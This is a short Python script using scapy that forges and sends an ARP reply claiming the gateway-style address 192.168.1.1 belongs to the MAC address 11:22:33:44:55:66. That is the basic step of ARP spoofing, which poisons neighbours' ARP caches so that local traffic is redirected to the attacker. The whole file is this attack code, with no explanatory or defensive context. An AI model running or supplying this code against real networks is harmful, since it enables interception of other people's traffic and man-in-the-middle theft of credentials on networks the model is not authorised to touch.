from scapy.all import ARP, send

packet = ARP(
    op = 2,
    psrc = "192.168.1.1",
    hwsrc = "11:22:33:44:55:66"
) 

send(packet)